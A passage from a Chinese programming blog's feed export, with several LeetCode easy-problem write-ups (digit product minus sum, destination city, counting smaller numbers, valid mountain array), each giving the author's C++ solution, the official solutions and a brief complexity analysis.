    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/subtract-the-product-and-sum-of-digits-of-an-integer/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数 <code>n</code>，请你帮忙计算并返回该整数「各位数字之积」与「各位数字之和」的差。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 234</span><br><span class="line">输出：15 </span><br><span class="line">解释：</span><br><span class="line">各位数之积 &#x3D; 2 * 3 * 4 &#x3D; 24 </span><br><span class="line">各位数之和 &#x3D; 2 + 3 + 4 &#x3D; 9 </span><br><span class="line">结果 &#x3D; 24 - 9 &#x3D; 15</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[输入：n &#x3D; 4421</span><br><span class="line">输出：21</span><br><span class="line">解释： </span><br><span class="line">各位数之积 &#x3D; 4 * 4 * 2 * 1 &#x3D; 32 </span><br><span class="line">各位数之和 &#x3D; 4 + 4 + 2 + 1 &#x3D; 11 </span><br><span class="line">结果 &#x3D; 32 - 11 &#x3D; 21</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 10^5</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>while循环，每次得到整数的一位，计算各位数字之积和各位数字之和，返回它们的差。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.3M，击败5.12%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">subtractProductAndSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mul=<span class="number">1</span>,sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            mul*=n%<span class="number">10</span>;</span><br><span class="line">            sum+=n%<span class="number">10</span>;</span><br><span class="line">            n=n/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mul-sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/subtract-the-product-and-sum-of-digits-of-an-integer/solution/zheng-shu-de-ge-wei-ji-he-zhi-chai-by-leetcode-sol/">官方题解</a>:</h6><p><strong>方法一：模拟</strong></p>
<p>我们每次通过取模运算得到 <code>n</code> 的最后一位，依次进行乘法和加法运算，最后将得到的积 <code>mul</code> 以及和 <code>add</code> 相减即可得到答案。</p>
<p><strong>c++代码：</strong>（执行0ms，击败100.00%，内存6.2M，击败5.92%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">subtractProductAndSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> add = <span class="number">0</span>, mul = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> digit = n % <span class="number">10</span>;</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">            add += digit;</span><br><span class="line">            mul *= digit;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mul - add;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：$O(logN)$。整数 $N$ 的位数为$log_{10}(N + 1)$，根据换底公式，它和时间复杂度中常用的以 $2$为底的$log$ 只相差一个常数，因此可以表示为$O(logN)$。</p>
<p>空间复杂度：$O(1)$。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>和官方题解思路相同，题目比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>旅行终点站</title>
    <url>/2020/11/10/%E6%97%85%E8%A1%8C%E7%BB%88%E7%82%B9%E7%AB%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/destination-city/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一份旅游线路图，该线路图中的旅行线路用数组 <code>paths</code> 表示，其中 <code>paths[i] = [cityAi, cityBi]</code> 表示该线路将会从 <code>cityAi</code> 直接前往 <code>cityBi</code> 。请你找出这次旅行的终点站，即没有任何可以通往其他城市的线路的城市。</p>
<p>题目数据保证线路图会形成一条不存在循环的线路，因此只会有一个旅行终点站。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：paths &#x3D; [[&quot;London&quot;,&quot;New York&quot;],[&quot;New York&quot;,&quot;Lima&quot;],[&quot;Lima&quot;,&quot;Sao Paulo&quot;]]</span><br><span class="line">输出：&quot;Sao Paulo&quot; </span><br><span class="line">解释：从 &quot;London&quot; 出发，最后抵达终点站 &quot;Sao Paulo&quot; 。本次旅行的路线是 &quot;London&quot; -&gt; &quot;New York&quot; -&gt; &quot;Lima&quot; -&gt; &quot;Sao Paulo&quot; 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：paths &#x3D; [[&quot;B&quot;,&quot;C&quot;],[&quot;D&quot;,&quot;B&quot;],[&quot;C&quot;,&quot;A&quot;]]</span><br><span class="line">输出：&quot;A&quot;</span><br><span class="line">解释：所有可能的线路是：</span><br><span class="line">&quot;D&quot; -&gt; &quot;B&quot; -&gt; &quot;C&quot; -&gt; &quot;A&quot;. </span><br><span class="line">&quot;B&quot; -&gt; &quot;C&quot; -&gt; &quot;A&quot;. </span><br><span class="line">&quot;C&quot; -&gt; &quot;A&quot;. </span><br><span class="line">&quot;A&quot;. </span><br><span class="line">显然，旅行终点站是 &quot;A&quot; 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：paths &#x3D; [[&quot;A&quot;,&quot;Z&quot;]]</span><br><span class="line">输出：&quot;Z&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= paths.length &lt;= 100</code></li>
<li><code>paths[i].length == 2</code></li>
<li><code>1 &lt;= cityAi.length, cityBi.length &lt;= 10</code></li>
<li><code>cityAi != cityBi</code></li>
<li>所有字符串均由大小写英文字母和空格字符组成。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>每个paths[i]的第一个元素是出发站，第二个是终点站。旅行的终点站也就是没有通往其他城市的路线。也就是说只要找第二个位置出现过而在第一个位置没出现过的城市。</p>
<p>双层for循环遍历，对每一条路线的到达站遍历所有的线路是否作为过出发站。</p>
<p><strong>c++代码：</strong>(执行用时24ms，击败92.48%，内存消耗10.1M，击败89.27%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">destCity</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&gt;&amp; paths)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=paths.size();</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//对每一条路线的到达站进行遍历判断是否是终点站</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="comment">//默认为true，不是终点站再改为false</span></span><br><span class="line">            <span class="keyword">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(paths[i][<span class="number">1</span>]==paths[j][<span class="number">0</span>])&#123;</span><br><span class="line">                    <span class="comment">//不是终点站</span></span><br><span class="line">                    flag=<span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                result=paths[i][<span class="number">1</span>];</span><br><span class="line">                <span class="comment">//只有一个旅行终点站，找到后终止循环</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，不过我这个代码效率也挺高了，对双百最接近的一次，哈哈哈😁</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>最小高度树</title>
    <url>/2020/11/10/%E6%9C%80%E5%B0%8F%E9%AB%98%E5%BA%A6%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
  </entry>
  <entry>
    <title>有多少小于当前数字的数字</title>
    <url>/2020/11/09/%E6%9C%89%E5%A4%9A%E5%B0%91%E5%B0%8F%E4%BA%8E%E5%BD%93%E5%89%8D%E6%95%B0%E5%AD%97%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/how-many-numbers-are-smaller-than-the-current-number/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>nums</code>，对于其中每个元素 <code>nums[i]</code>，请你统计数组中比它小的所有数字的数目。</p>
<p>换而言之，对于每个 <code>nums[i]</code> 你必须计算出有效的 <code>j</code> 的数量，其中 <code>j</code> 满足 <code>j != i</code> <strong>且</strong> <code>nums[j] &lt; nums[i]</code> 。</p>
<p>以数组形式返回答案。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [8,1,2,2,3]</span><br><span class="line">输出：[4,0,1,1,3]</span><br><span class="line">解释： </span><br><span class="line">对于 nums[0]&#x3D;8 存在四个比它小的数字：（1，2，2 和 3）。 </span><br><span class="line">对于 nums[1]&#x3D;1 不存在比它小的数字。</span><br><span class="line">对于 nums[2]&#x3D;2 存在一个比它小的数字：（1）。 </span><br><span class="line">对于 nums[3]&#x3D;2 存在一个比它小的数字：（1）。 </span><br><span class="line">对于 nums[4]&#x3D;3 存在三个比它小的数字：（1，2 和 2）。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [6,5,4,8]</span><br><span class="line">输出：[2,1,0,3]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [7,7,7,7]</span><br><span class="line">输出：[0,0,0,0]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 500</code></li>
<li><code>0 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组nums，对每一个元素和数组nums中的所有元素进行比较，大于则数目加1。</p>
<p><strong>c++代码：</strong>(执行用时68ms，击败17.74%，内存消耗10.1M，击败77.40%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">int</span> num;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size();++i)&#123;</span><br><span class="line">            num=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;nums.size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]&lt;nums[i])&#123;</span><br><span class="line">                    ++num;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            result.push_back(num);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/how-many-numbers-are-smaller-than-the-current-number/solution/you-duo-shao-xiao-yu-dang-qian-shu-zi-de-shu-zi--2/">官方题解:</a></h6><p><strong>方法一：暴力</strong><br>比较容易想到的一个方法是，对于数组中的每一个元素，我们都遍历数组一次，统计小于当前元素的数的数目。</p>
<p><strong>c++代码：</strong>（执行16ms，击败56.92%，内存10.7M，击败7.63%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ret;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret.push_back(cnt);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N^2)$，其中 $N$ 为数组的长度。</li>
<li>空间复杂度：$O(1)$。注意我们不计算答案数组的空间占用。</li>
</ul>
<p><strong>方法二：快速排序</strong><br>我们也可以将数组排序，并记录每一个数在原数组中的位置。对于排序后的数组中的每一个数，我们找出其左侧第一个小于它的数，这样就能够知道数组中小于该数的数量。</p>
<p><strong>c++代码：</strong>（执行32ms，击败36.78%，内存10.7M，击败7.90%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; data;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            data.emplace_back(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(data.begin(), data.end());</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ret</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> prev = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prev == <span class="number">-1</span> || data[i].first != data[i - <span class="number">1</span>].first) &#123;</span><br><span class="line">                prev = i;</span><br><span class="line">            &#125;</span><br><span class="line">            ret[data[i].second] = prev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>复杂度分析</p>
<p>时间复杂度：$O(Nlog N)$，其中 $N$ 为数组的长度。排序需要 $O(Nlog N)$的时间，随后需要 $O(N)$ 时间来遍历。</p>
<p>空间复杂度：$O(N)$。因为要额外开辟一个数组。</p>
<p><strong>方法三：计数排序</strong><br>注意到数组元素的值域为 [0,100]，所以可以考虑建立一个频次数组 $cnt$ ，$cnt[i]$ 表示数字 $i$ 出现的次数。那么对于数字 $i$i而言，小于它的数目就为 $cnt[0…i-1]$ 的总和。</p>
<p><strong>c++代码：</strong>（执行12ms，击败73.62%，内存10.3M，击败39.54%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">101</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cnt[nums[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            cnt[i] += cnt[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ret;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            ret.push_back(nums[i] == <span class="number">0</span> ? <span class="number">0</span>: cnt[nums[i]<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：$O(N + K)$，其中 $K$为值域大小。需要遍历两次原数组，同时遍历一次频次数组 $cnt$ 找出前缀和。</p>
<p>空间复杂度：$O(K)$。因为要额外开辟一个值域大小的数组。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>还是最直观的暴力方法最好想，官方题解有多种做法。提交后的执行用时波动也挺大的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>有效的山脉数组</title>
    <url>/2020/11/03/%E6%9C%89%E6%95%88%E7%9A%84%E5%B1%B1%E8%84%89%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>有效的山脉数组</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h6><p>给定一个数组<code>A</code>，如果它是有效的山脉数组就返回<code>true</code>，否则返回<code>false</code>。</p>
<p>让我们回顾一下，如果<code>A</code>满足下述条件，那么它是一个山脉数组：</p>
<ul>
<li><p><code>A.length &gt;= 3</code></p>
</li>
<li><p>在 <code>0 &lt; i &lt; A.length - 1</code> 条件下，存在 i 使得：</p>
<ul>
<li><code>A[0] &lt; A[1] &lt; ... A[i-1] &lt; A[i]</code></li>
</ul>
</li>
<li><code>A[i] &gt; A[i+1] &gt; ... &gt; A[A.length - 1]</code></li>
</ul>
<a id="more"></a>
<p><img src="/2020/11/03/%E6%9C%89%E6%95%88%E7%9A%84%E5%B1%B1%E8%84%89%E6%95%B0%E7%BB%84/hint_valid_mountain_array.png" alt="img"></p>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>0 &lt;= A.length &lt;= 10000</code></li>
<li><code>0 &lt;= A[i] &lt;= 10000</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>可以两次for循环每次循环到中间最大值，第一次从前往后遍历升序判断，第二次从后往前遍历升序判断。</p>
<p><strong>c++代码：</strong>(执行用时56ms，击败90.92%，内存消耗21.2M，击败5.27%)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">validMountainArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(A.size()&lt;<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; A.size() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            <span class="comment">//前半部分结束</span></span><br><span class="line">            <span class="keyword">if</span>(A[i] &gt;= A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>) &#123;</span><br><span class="line">                    result = <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//前半部分满足</span></span><br><span class="line">                    result = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断后半部分</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; A.size() - <span class="number">1</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">//不是山脉数组</span></span><br><span class="line">            <span class="keyword">if</span>(A[j] &lt;= A[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                result = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
